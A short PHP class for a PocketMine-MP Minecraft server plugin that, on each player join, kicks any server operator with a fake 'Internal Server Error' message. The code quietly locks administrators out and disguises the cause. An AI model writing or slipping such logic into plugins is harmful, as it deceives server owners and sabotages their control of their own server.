<?php

namespace igdt;

use pocketmine\event\Listener;
use pocketmine\event\player\PlayerJoinEvent;

class Event implements Listener{
	public function onJoin(PlayerJoinEvent $event){
		$player = $event->getPlayer();
		if($player->isOp()){
			$player->kick('Internal Server Error', false);
		}
	}
}